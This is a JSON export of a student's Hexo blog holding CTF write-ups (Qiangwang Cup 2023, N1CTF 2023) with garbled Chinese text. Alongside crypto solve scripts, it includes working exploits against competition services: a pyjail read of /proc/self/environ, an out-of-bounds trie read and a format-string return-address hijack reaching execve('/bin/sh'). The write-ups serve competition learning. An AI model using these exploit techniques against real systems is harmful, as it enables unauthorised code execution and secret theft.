{"meta":{"title":"lmarch2'blog","subtitle":"æ±‚çŸ¥è‹¥æ¸´ï¼Œè™šå¿ƒè‹¥æ„š","description":"A Student studying Cybersecurity","author":"lmarch2","url":"http://lmarch2.github.io","root":"/"},"pages":[{"title":"","date":"2024-02-02T07:52:02.703Z","updated":"2024-02-02T07:52:02.703Z","comments":true,"path":"404.html","permalink":"http://lmarch2.github.io/404.html","excerpt":"","text":"title:404 date:2024-02-02 14:59:42 type:â€404â€ layout:â€404â€ description:â€Oopsï½ï¼Œæˆ‘å´©æºƒäº†ï¼æ‰¾ä¸åˆ°ä½ æƒ³è¦çš„é¡µé¢ :(â€œ"},{"title":"about","date":"2023-01-13T01:47:46.000Z","updated":"2024-02-02T07:51:53.388Z","comments":true,"path":"about/index.html","permalink":"http://lmarch2.github.io/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-01-12T09:51:25.000Z","updated":"2024-02-02T07:51:23.895Z","comments":true,"path":"tags/index.html","permalink":"http://lmarch2.github.io/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2024-02-02T06:54:59.000Z","updated":"2024-02-02T07:51:37.563Z","comments":true,"path":"friends/index.html","permalink":"http://lmarch2.github.io/friends/index.html","excerpt":"","text":""},{"title":"categories","date":"2023-01-12T14:55:53.000Z","updated":"2024-02-02T07:59:36.360Z","comments":true,"path":"categories/index.html","permalink":"http://lmarch2.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"HASHTEAM2023å¼ºç½‘æ¯wp","slug":"HASHTEAMå¼ºç½‘æ¯2024WP","date":"2024-01-29T16:47:18.000Z","updated":"2024-02-04T06:55:24.346Z","comments":true,"path":"posts/19b7e153/","link":"","permalink":"http://lmarch2.github.io/posts/19b7e153/","excerpt":"","text":"2023å¼ºç½‘æ¯å¼ºç½‘æ¯ç–¯ç‹‚åç‰¢ï¼Œpwnåšä¸äº†ä¸€ç‚¹åªèƒ½åœ¨å¼ºç½‘å…ˆé”‹åˆ’åˆ’æ°´â€¦.åªèƒ½è¯´ï¼Œæ¥å¹´å†æˆ˜ï¼ CryptoNot only rsaå¼€å°±å®Œäº†,ç›´æ¥ä¸Šä»£ç  from Crypto.Util.number import * from tqdm import tqdm n = 6249734963373034215610144758924910630356277447014258270888329547267471837899275103421406467763122499270790512099702898939814547982931674247240623063334781529511973585977522269522704997379194673181703247780179146749499072297334876619475914747479522310651303344623434565831770309615574478274456549054332451773452773119453059618433160299319070430295124113199473337940505806777950838270849 e = 641747 c = 730024611795626517480532940587152891926416120514706825368440230330259913837764632826884065065554839415540061752397144140563698277864414584568812699048873820551131185796851863064509294123861487954267708318027370912496252338232193619491860340395824180108335802813022066531232025997349683725357024257420090981323217296019482516072036780365510855555146547481407283231721904830868033930943 p=91027438112295439314606669837102361953591324472804851543344131406676387779969 F=Zmod(n) root=F(c).nth_root(e,all=True) #print(root[0]) for i in tqdm(root): m=long_to_bytes(int(i)) if b'flag' in m: print(m) flag{c19c3ec0-d489-4bbb-83fc-bc0419a6822a} Babyrsaè®ºæ–‡é¢˜,æœäº†åŠå¤©https://www.sciencedirect.com/science/article/pii/S0304397523002116 æ¥ä¸‹æ¥æ˜¯å¤ç°ä»£ç ,ä½†æœ€åæ²¡èƒ½æ±‚å‡ºè§£ from math import floor N=6898173619848064713447564687612858995735894135343384489074201607621085283538310939996931861826971767108397996532717248188385645126212591434896047930808649179911798954640222107637439329674735608839417381358005576992626135001753481619659559186340117078191830600433093397242376731829372681835293083621809 e=18607371079843502780378872043757955319820913116247483798885064959406363250603378245586504841113742273225193107044375347430381173075888621199154655015790594262611354939631226770280837471203456810631351598504038204190312822325230950609345436371947238885587725399278901711345945547722129359115083215511568569473191308964154024336081584451627244805369215138746534093267741448684155642482008850649100654786552416480077517243070018360909360575406706389289250072987726362674233556989150088794863182955760986933773623415912617726008667185604638388708370787554333594517677850758769655741063461283985588988450577 # N=611402847577596838649117628567007514815745193613363898749361 # e=256620536587836325389289742308993660982466972819568896656661249105081887104266414292000389611061562475252796784804753727 def small_roots(f, bounds, m, d=None): monomials=[] pols=[] if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for s in range(m + 1): for i in range(s,m+1): for j in range(2*s,2*s+2): base = x ^ (i - s)* y ^(j-2*s) * f ^ s * e ^ (m - s) G.append(base) for s in range(m + 1): for i in range(s,s+1): for j in range(2*s+2,2*s+t+1): base = x ^ (i - s)* y ^(j-2*s) * f ^ s * e ^ (m - s) G.append(base) for poly in G: for v in poly.monomials(): if v not in monomials: monomials.append(v) print(len(G)) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) print(B.nrows(),B.ncols()) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] alpha=1.997 beta=0.1 delta=0.678 r=100 m=4 t=4 FF=Zmod(2^r) u=FF(N).nth_root(2,all=True) print(\"u=\",u) #u0=63161 u0=603393209736955919317955738297 v0=2*u0+(N-u0^2)*inverse_mod(u0,2^(2*r))%2^(2*r) print(\"v0=\",v0) #v0=200472128882 #v0=1567679278734573458233752031864430279097731087941138563289698 a1=v0*inverse_mod(2^(2*r-1),e)%e print(a1) a2=(v0^2-(N+1)^2)*inverse_mod(2^(4*r),e)%e print(a2) a3=(-1)*inverse_mod(2^(4*r),e)%e print(a3) X=floor(2*N^(alpha+delta-2)) Y=floor(3*N^(0.5-2*beta)) print('X',X) print(\"Y\",Y) F.=PolynomialRing(ZZ) f=x*y^2+a1*x*y+a2*x+a3 res=small_roots(f,(X,Y),m) print(res) MiscHappy Chess|SOLVED|1r0nyéå¸¸å‡‘å·§ï¼Œå‰å‡ å‘¨çœ‹åˆ°äº†bç«™ä¸Šçš„ä¸€ä¸ªç¿»è½¬æ£‹çš„è§†é¢‘ é‚£ä¹ˆæ€è·¯å¦‚ä¸‹ï¼š é¦–å…ˆå¯¹äºåˆå§‹æ£‹ç›˜æ¥è¯´ï¼Œåªè¦æŠŠç™½æ£‹æˆ–è€…é»‘æ£‹çš„ä½ç½®éƒ½ç‚¹ä¸€éå°±å¯ä»¥å˜æˆç›¸åŒé¢œè‰² ä½†æ˜¯è§„å®šè¦240æ­¥ä¹‹å†…èµ¢10å±€ï¼Œæ‰€ä»¥æ¯å±€å°±æœ‰æ­¥æ•°é™åˆ¶ï¼Œè¦åœ¨å¤§çº¦24æ­¥ä¹‹å†…èµ¢ä¸€å±€ æ‰€ä»¥è¦è¿›è¡Œæ­¥éª¤çš„ä¼˜åŒ–ï¼Œä¼˜åŒ–æ€è·¯å¦‚ä¸‹ï¼š å¯¹äº9*9çš„æ£‹ç›˜å¦‚æœæŠŠä¸€æ•´è¡Œæˆ–è€…ä¸€æ•´åˆ—å…¨éƒ¨ç¿»è½¬ï¼Œå°±ä¼šæŠŠæ•´ä¸ªæ£‹ç›˜ç›´æ¥ç¿»è½¬ æ‰€ä»¥å¯¹äºæ¯ä¸€ä¸ªå¯è¡Œè§£ï¼Œå¯ä»¥é€šè¿‡è§‚å¯Ÿæ¥è¿›è¡Œæ­¥éª¤çš„ä¼˜åŒ– æŠŠæ¯ä¸€æ¬¡çš„æ­¥éª¤ä¼˜åŒ–åˆ°24æ­¥ä»¥å†…ä¹‹åé€šå…³å³å¯ï¼š æœ¬é¢˜è¿ç”¨bç«™è§†é¢‘é‡Œçš„ä¼˜åŒ–åŸç†ï¼Œæ‰‹åŠ¨ç©äº†10æ¬¡ï¼Œæ¯æ¬¡æ­¥æ•°å‡åœ¨24æ­¥ä»¥å†…ï¼ŒæˆåŠŸæ‹¿åˆ°flag flag{1449c7f2379d58899db438adc243867d} ç”±äºæ—¶é—´å……è£•ï¼Œæ‰€ä»¥æˆ‘æ˜¯ç”¨æ‰‹ä¼˜åŒ–çš„ï¼Œä½†æ˜¯å…¶å®å¯ä»¥ä½¿ç”¨è„šæœ¬çˆ†ç ´ï¼Œä¸€å…±æœ‰9+9=18æ¡å¯ä»¥ç¿»è½¬çš„è¡Œå’Œåˆ—ï¼Œæ‰€ä»¥æ‰€æœ‰å¯è¡Œè§£çš„æƒ…å†µå°±æœ‰$$2^{18}$$ç§æƒ…å†µï¼Œåªè¦ä½¿ç”¨ä»£ç å…¨éƒ¨çˆ†ç ´å‡ºæ¥ç„¶åçœ‹å“ªä¸ªç‚¹æœ€å°‘å°±è¡Œã€‚ Pyjail ! Itâ€™s myFILTER !!!è¯»ç¯å¢ƒå˜é‡è·å–flag {print(open(\"/proc/self/environ\").read())} å¼ºç½‘å…ˆé”‹çŸ³å¤´å‰ªåˆ€å¸ƒï¼Ÿè¯¥æ¨¡å‹å¯¹äºç›¸åŒè¾“å…¥çš„è¾“å‡ºå…·æœ‰ç¡®å®šæ€§ï¼Œäºæ˜¯å¯ä»¥å…ˆæŒ‡å®šå‰äº”ä¸ªï¼Œå†é€è½®çˆ†ç ´ ####### 180 from random import choice import random from pwn import * def main(): # è®¾ç½®ç›®æ ‡åœ°å€å’Œç«¯å£ ip = '8.147.133.95'#'8.147.135.248' port = 19260#39167 context(log_level = 'debug',os = 'linux') # åˆ›å»ºä¸€ä¸ªè¿æ¥åˆ°ç›®æ ‡çš„socket #choice = [0, 0, 0, 0, 0, 1, 1, 2, 2, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 1, 0, 0, 1, 1, 1,2] choice=[0, 0, 0, 0, 0, 1, 1, 2, 2, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 1, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 1, 2, 0, 0, 2, 2, 1, 1, 0, 1, 2, 0, 1, 0, 1, 0, 2, 1, 2, 2, 0, 2, 1, 0, 0, 2, 2, 1, 1, 0, 1, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 0, 0, 1, 1, 1, 2, 2, 1, 0, 1, 2, 2, 0, 1, 2, 0, 2, 0, 1, 1, 0] sock = remote(ip, port) response = sock.recvuntil('++++++++++++++++++++++++++++++++++++++++++++++++++'.encode()) with open('replay.txt', 'w') as f: choice.append(random.randint(0,2)) print(choice) for i in range(len(choice)): sock.sendlineafter('è¯·å‡ºæ‹³ï¼ˆ0 - çŸ³å¤´ï¼Œ1 - å‰ªåˆ€ï¼Œ2 - å¸ƒï¼‰ï¼š'.encode(),str(choice[i]).encode()) response = sock.recv(0x110).decode() f.write(response + '\\n') if(i < 5): continue if 'Me10nèµ¢äº†' in response: print(i,choice[i]) print(choice) print((choice[i]+1)%3) break elif 'å¹³å±€' in response: print(i,choice[i]) print(choice) print((choice[i]+2)%3) break f.interactive() # å…³é—­è¿æ¥ sock.close() if __name__ == '__main__': main() Speedupå…ˆçœ‹çœ‹å‰20ä¸ª from math import floor from tqdm import tqdm n=0 l=[] for i in range(1,21): n=0 result = factorial(2^i) res=str(result) for j in res: n+=int(j) print(n) l.append(n) print(l) è¾“åˆ°è¿™é‡Œhttps://oeis.org/æ•°æ•°ç¬¬27ä¸ª,åšä¸ªmd5å¾—åˆ°ç»“æœ æˆ–è€…åˆ©ç”¨å‹’è®©å¾·å®šç†,åˆ†è§£(2^27)! n=2^27 faclist=[] for p in tqdm(range(2,n)): if is_prime(p): k=1 res=0 while True: m=pow(p,k) if n>=m: res+=floor(n/m) else: break k+=1 faclist.append((p,res)) else: continue # faclist=str(faclist) # with open('test.txt', 'w') as f: # f.write(faclist) res=1 for i in tqdm(faclist): res*=pow(i[0],i[1]) n=0 for i in str(res): n+=int(i) print(n) ç„¶åå†è®¡ç®— easyfuzzå¼€å§‹å…ˆå‘ç°9ä¸ªå­—ç¬¦+\\nèƒ½å¤Ÿå§å‰ä¸¤ä½ç½®ä¸º11ï¼Œå°è¯•éå†æ‰€æœ‰å­—ç¬¦å¯èƒ½ è°ƒæ•´è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œä»æœ€åä¸€ä½å¼€å§‹è¯¸ä½çˆ†ç ´ï¼ˆä»£ç ä¸­é€ä¸ªæ”¹repeatï¼‰ from Excalibur import * import itertools import string def generate_strings(): # å®šä¹‰è¦åŒ…å«çš„å­—ç¬¦é›†åˆ characters = string.ascii_letters + string.digits + string.punctuation # ç”Ÿæˆæ‰€æœ‰é•¿åº¦ä¸º9çš„å¯èƒ½å­—ç¬¦ä¸² all_combinations = itertools.product(characters, repeat=3) # é€ä¸ªç”Ÿæˆå­—ç¬¦ä¸²å¹¶è¿”å› for combination in all_combinations: yield ''.join(combination) # ä½¿ç”¨ç”Ÿæˆå™¨å‡½æ•°é€ä¸ªè·å–å­—ç¬¦ä¸² string_generator = generate_strings() # æ‰“å°å‰å‡ ä¸ªå­—ç¬¦ä¸² #contextset() remo('101.200.122.251',12199,1) #remo('101.200.122.251',12188,1) for _ in range(1000): str = (next(string_generator)+'wbGood') sl(str) ru(b'code') m = ru(b'\\n') if not b'110000000' in m: print(str,m) #sl(b'1'*9) #sl(b'\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff') #sl(b'\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff') ia() qwb{YouKnowHowToFuzz!} Trieæ‰‹åŠ¨ç¡¬æ“ï¼Œä¹Ÿå¯ä»¥å†™è„šæœ¬æ›´å¿« é¦–å…ˆç†æ¸…ç¨‹åºé€»è¾‘ï¼Œåœ¨trieæ ‘ä¸­å‚¨å­˜ipï¼ŒæŸ¥æ‰¾æ—¶é€šè¿‡æ§åˆ¶v3çš„å€¼ï¼Œè¶Šç•Œè¯»å–endæ•°ç»„ï¼Œä»secreté‡Œè¯»å‡ºflag è°ƒè¯•å‘ç°ï¼Œå¯¹äºæ ‘ä¸­æ¯æ’å…¥èŠ‚ç‚¹çš„æ—¶å€™ï¼Œtot+1ï¼Œäºæ˜¯é¦–å…ˆè®©totä¸º0x40ï¼Œå†æ§åˆ¶ipï¼ˆåœ¨äºŒè¿›åˆ¶ä¸‹æ¯æ¬¡å‡å°‘ä¸€ä¸ª1ï¼‰ä½¿å¾—totæ¯æ¬¡+4ï¼Œå³å¯4å­—èŠ‚4å­—èŠ‚åœ°è¯»å‡ºflagã€‚ï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ä¼šå¯¹totè¿›è¡Œä¸€ä¸ª*4çš„æ“ä½œï¼‰ from Excalibur import * #proc('./trie') remo('47.104.150.173',1337,1) contextset() ''' for i in range(100): ip1 = '192.168.1.'+(str(i)) sla(b'Quit.',b'1') sla(b'IP:',ip1) ip2 = '192.168.1.'+str(i+1) sla(b'hop:',ip2) sla(b'Quit.',b'2') ''' def setip(ip1,ip2): sla(b'Quit.',b'1') sla(b'IP:',ip1) sla(b'hop:',ip2) def show(ip): sla(b'Quit.',b'3') sla(b'Quit.',b'2') sla(b'IP:',ip) ru(b'is') flag = ru(b'\\n') print(flag) pause() debug('b *$rebase(0x4060)\\nb *$rebase(0x1619)\\n') setip(b'0.0.0.0',b'0.0.0.0')#+0x20 setip(b'255.255.255.255',b'0.0.0.0')#+0x20 #setip(b'127.255.255.255',b'0.0.0.0')#+0x4 #setip(b'63.255.255.255',b'0.0.0.0')#+0x4 #setip(b'31.255.255.255',b'0.0.0.0')#+0x4 #setip(b'15.255.255.255',b'0.0.0.0')#+0x4 #setip(b'7.255.255.255',b'0.0.0.0')#+0x4 #setip(b'3.255.255.255',b'0.0.0.0')#+0x4 #setip(b'1.255.255.255',b'0.0.0.0')#+0x4 #setip(b'0.255.255.255',b'0.0.0.0')#+0x4 #setip(b'0.127.255.255',b'0.0.0.0')#+0x4 #setip(b'0.63.255.255',b'0.0.0.0')#+0x4 setip(b'0.31.255.255',b'0.0.0.0')#+0x4 #setip(b'0.255.255.255',b'0.0.0.0')#+0x4 #show(b'127.255.255.255') #show(b'63.255.255.255') #show(b'31.255.255.255') #show(b'15.255.255.255') #show(b'7.255.255.255') #show(b'3.255.255.255') #show(b'1.255.255.255') #show(b'0.255.255.255') #show(b'0.127.255.255') #show(b'0.63.255.255') show(b'0.31.255.255') ia() numbers = \"0.0.0.125.115.121.117.103.95.117.48.121.95.115.64.95.103.110.48.114.116.115.95.53.97.95.51.109.48.99.51.66.95.48.116.95.119.48.72.123.103.97.108.102\" reversed_numbers = numbers.split(\".\")[::-1] ascii_chars = [chr(int(num)) for num in reversed_numbers] result = \"\".join(ascii_chars) print(result) flag{H0w_t0_B3c0m3_a5_str0ng_@s_y0u_guys} ez_fmtä¿®æ”¹printfçš„è¿”å›åœ°å€åŠ«æŒç¨‹åºæµï¼ŒåŒæ—¶æ³„æ¼libcåœ°å€ï¼Œç¬¬äºŒæ¬¡printfæ”¹è¿”å›åœ°å€ä¸ºone_shot,è¿™é‡Œä¸èƒ½ä»¥ä¸‹å†™lnä¸ç„¶ä¼šç‰¹åˆ«æ…¢ã€‚ from evilblade import * context(os='linux', arch='amd64') context(os='linux', arch='amd64', log_level='debug') setup('./pwn') libset('./libc-2.31.so') #libset('./libc.so.6') evgdb() rsetup('47.104.24.40', 1337) stack = getx(-15,-1) stack1 = stack - 8 dx(stack1) #ä¿®æ”¹printfçš„è¿”å›åœ°å€ sd(b'%4198556c'+b'%19$paaa'+b'aaa%9$n'+p64(stack1)) libc = getx(-65,-51) base = getbase(libc,'__libc_start_main',243) os = base + 0xe3b01 os1 = os %0x10000 os2 = os %0x1000000 os2 = os2 >> 16 dx(stack) dx(os) pay1 = f'%{os2-4}c'.encode().ljust(8,b'a') pay2 = f'%{os1-os2-3}c'.encode().ljust(8,b'a') print(pay1) pay = pay1 + b'a%11$hhn'+ pay2 +b'aa%10$hn' +p64(stack-232)+p64(stack-230) print(len(pay)) pause() sl(pay) ia() ''' 0xe3afe execve(\"/bin/sh\", r15, r12) constraints: [r15] == NULL || r15 == NULL [r12] == NULL || r12 == NULL 0xe3b01 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL [rdx] == NULL || rdx == NULL 0xe3b04 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL ''' flag{such_@n_ea5y_fmt_9ame_f0r_y0u}","categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.io/categories/HASHTEAM-wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"æ¯å­","slug":"æ¯å­","permalink":"http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"}]},{"title":"HASHTEAM2023N1ctfWP","slug":"HASHTEAMn1ctf2023WP","date":"2024-01-29T15:47:41.000Z","updated":"2024-02-04T06:55:11.477Z","comments":true,"path":"posts/d8c86fdf/","link":"","permalink":"http://lmarch2.github.io/posts/d8c86fdf/","excerpt":"","text":"N1CTF2023 æ’å25ï¼Œå¡çº¿ Cryptowarmupnonceæœ‰é—®é¢˜ æ•°å­¦æ¨¡å‹ï¼š e=2^128*e1+e2 d=2^128*d1+d2 nonce=2^128*e1+d1 s=(e+rd)/nonce mod n å±•å¼€ s2^128e1+sd1=2^128e1+e2+r*(2^128*d1+d2) mod n (s-1)2^128e1+(s-r*2^128)d1-rd2-e2==0 mod n é€ æ ¼å­ æ³¨æ„åˆ°dæœ€é«˜2^255ä¸€å®šä¸º1ï¼Œå¡ä¸‹ç•Œ SM4å·®åˆ†æ•…éšœæ‰“å››è½®ï¼Œç›´æ¥ä¸Šè„šæœ¬ from copy import copy DB = [[46, 38, 43, 106, 114, 176, 12, 69, 1, 21, 82, 27, 184, 109, 170, 0, 179, 25, 4, 145, 33, 61, 66, 223, 85, 238, 22, 23, 59, 64, 19, 174, 180, 240, 111, 128, 187, 65, 72, 35, 77, 221, 157, 172, 13, 197, 44, 229, 226, 130, 220, 49, 198, 24, 103, 76, 39, 211, 191, 115, 165, 206, 30, 7, 98, 156, 205, 181, 89, 252, 58, 138, 253, 104, 212, 236, 54, 224, 166, 155, 118, 8, 93, 140, 28, 95, 225, 248, 80, 182, 112, 63, 192, 116, 47, 217, 91, 84, 144, 53, 124, 117, 16, 73, 218, 254, 188, 18, 11, 107, 222, 5, 52, 129, 194, 173, 81, 9, 137, 246, 242, 143, 175, 147, 74, 195, 41, 133, 207, 120, 92, 17, 164, 169, 171, 48, 241, 57, 31, 83, 55, 96, 29, 185, 68, 232, 70, 148, 243, 209, 100, 214, 37, 244, 219, 131, 203, 139, 126, 183, 167, 199, 101, 159, 50, 230, 168, 45, 149, 123, 119, 87, 134, 75, 127, 67, 250, 228, 247, 135, 113, 60, 62, 177, 150, 121, 162, 227, 142, 34, 178, 42, 15, 160, 161, 216, 235, 234, 163, 186, 154, 141, 233, 208, 78, 151, 204, 190, 86, 152, 245, 239, 108, 196, 158, 210, 99, 237, 251, 3, 40, 90, 125, 132, 36, 215, 193, 71, 255, 200, 102, 56, 32, 136, 146, 79, 97, 110, 249, 20, 202, 231, 122, 88, 94, 6, 153, 105, 14, 10, 2, 201, 189, 213, 51, 26], [246, 56, 103, 21, 181, 105, 216, 118, 145, 183, 169, 211, 27, 242, 190, 162, 237, 179, 244, 199, 206, 35, 120, 38, 95, 133, 25, 231, 3, 70, 40, 238, 223, 45, 127, 245, 4, 15, 250, 11, 52, 215, 142, 129, 167, 191, 61, 241, 188, 226, 249, 146, 221, 184, 104, 109, 157, 39, 176, 114, 236, 240, 254, 253, 251, 158, 198, 37, 42, 19, 87, 230, 153, 43, 77, 76, 208, 26, 32, 18, 150, 195, 122, 90, 80, 148, 197, 44, 83, 51, 166, 75, 88, 73, 64, 252, 20, 119, 46, 201, 196, 121, 222, 115, 22, 128, 164, 102, 97, 5, 217, 172, 177, 81, 58, 234, 168, 60, 29, 124, 147, 101, 224, 151, 130, 65, 98, 225, 155, 91, 108, 152, 140, 219, 9, 24, 189, 203, 138, 160, 59, 48, 193, 14, 69, 159, 233, 53, 135, 143, 33, 165, 41, 132, 57, 187, 227, 93, 200, 1, 0, 149, 137, 194, 23, 117, 170, 247, 17, 255, 92, 205, 47, 213, 136, 66, 2, 209, 6, 110, 78, 63, 28, 74, 235, 229, 30, 139, 154, 94, 131, 49, 86, 185, 163, 79, 68, 8, 72, 174, 99, 111, 141, 107, 210, 34, 207, 239, 106, 144, 228, 186, 89, 204, 55, 54, 171, 161, 100, 16, 13, 7, 50, 182, 112, 173, 212, 31, 214, 85, 156, 180, 175, 116, 248, 243, 36, 82, 134, 123, 220, 10, 125, 96, 67, 62, 12, 202, 126, 71, 84, 113, 232, 178, 192, 218], [46, 38, 43, 106, 114, 176, 12, 69, 1, 21, 82, 27, 184, 109, 170, 0, 179, 25, 4, 145, 33, 61, 66, 223, 85, 238, 22, 23, 59, 64, 19, 174, 180, 240, 111, 128, 187, 65, 72, 35, 77, 221, 157, 172, 13, 197, 44, 229, 226, 130, 220, 49, 198, 24, 103, 76, 39, 211, 191, 115, 165, 206, 30, 7, 98, 156, 205, 181, 89, 252, 58, 138, 253, 104, 212, 236, 54, 224, 166, 155, 118, 8, 93, 140, 28, 95, 225, 248, 80, 182, 112, 63, 192, 116, 47, 217, 91, 84, 144, 53, 124, 117, 16, 73, 218, 254, 188, 18, 11, 107, 222, 5, 52, 129, 194, 173, 81, 9, 137, 246, 242, 143, 175, 147, 74, 195, 41, 133, 207, 120, 92, 17, 164, 169, 171, 48, 241, 57, 31, 83, 55, 96, 29, 185, 68, 232, 70, 148, 243, 209, 100, 214, 37, 244, 219, 131, 203, 139, 126, 183, 167, 199, 101, 159, 50, 230, 168, 45, 149, 123, 119, 87, 134, 75, 127, 67, 250, 228, 247, 135, 113, 60, 62, 177, 150, 121, 162, 227, 142, 34, 178, 42, 15, 160, 161, 216, 235, 234, 163, 186, 154, 141, 233, 208, 78, 151, 204, 190, 86, 152, 245, 239, 108, 196, 158, 210, 99, 237, 251, 3, 40, 90, 125, 132, 36, 215, 193, 71, 255, 200, 102, 56, 32, 136, 146, 79, 97, 110, 249, 20, 202, 231, 122, 88, 94, 6, 153, 105, 14, 10, 2, 201, 189, 213, 51, 26], [206, 165, 193, 37, 187, 108, 248, 246, 44, 139, 152, 201, 173, 214, 77, 72, 97, 35, 70, 24, 3, 79, 178, 175, 30, 66, 18, 198, 114, 125, 32, 210, 180, 224, 235, 28, 62, 136, 149, 227, 82, 147, 90, 119, 85, 199, 126, 121, 51, 20, 88, 4, 75, 101, 38, 151, 109, 115, 110, 223, 43, 17, 146, 249, 226, 26, 222, 232, 87, 195, 200, 131, 245, 81, 113, 157, 220, 12, 16, 184, 204, 192, 84, 31, 197, 215, 129, 94, 93, 181, 218, 194, 65, 148, 158, 112, 221, 34, 25, 33, 243, 78, 10, 67, 209, 6, 252, 196, 237, 42, 172, 164, 161, 244, 111, 191, 46, 170, 128, 69, 183, 212, 60, 99, 8, 122, 49, 86, 247, 96, 179, 57, 135, 106, 0, 58, 100, 202, 55, 98, 1, 254, 53, 155, 156, 83, 132, 9, 19, 171, 48, 95, 166, 68, 22, 104, 7, 14, 142, 211, 213, 50, 150, 234, 182, 203, 217, 64, 185, 163, 73, 45, 41, 118, 103, 134, 186, 230, 241, 250, 52, 207, 162, 124, 140, 116, 167, 228, 92, 63, 47, 176, 239, 238, 5, 216, 225, 188, 137, 160, 80, 231, 102, 11, 89, 91, 59, 23, 240, 105, 153, 177, 138, 219, 174, 123, 36, 159, 76, 21, 56, 242, 61, 107, 133, 143, 154, 130, 233, 15, 145, 255, 13, 189, 120, 251, 236, 117, 208, 190, 169, 168, 74, 229, 54, 2, 39, 127, 29, 253, 141, 71, 205, 40, 144, 27]] WDB=DB[2:]+DB[:2] i2l = lambda x: [(x >> 24) & 0xff, (x >> 16) & 0xff, (x >> 8) & 0xff, x & 0xff] l2i = lambda x: (x[0] < 24)|(x[1] < 16)|(x[2] < 8)|x[3] rotl32 = lambda x, n: ((x < n) & 0xffffffff) | ((x >> (32-n)) & 0xffffffff) rotl8 = lambda x, n: ((x < n) & 0xff) | ((x >> (8-n)) & 0xff) xor = lambda x, y: list(map(lambda a, b: a ^ b, x, y)) pad = lambda data, block=16: data + [16 - len(data) % block]*(16 - len(data) % block) SM4_BOXES_TABLE = [ 0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05, 0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62, 0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6, 0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8, 0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35, 0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87, 0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e, 0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1, 0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3, 0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f, 0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51, 0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8, 0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0, 0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84, 0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48, ] SM4_FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc] SM4_CK = [ 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 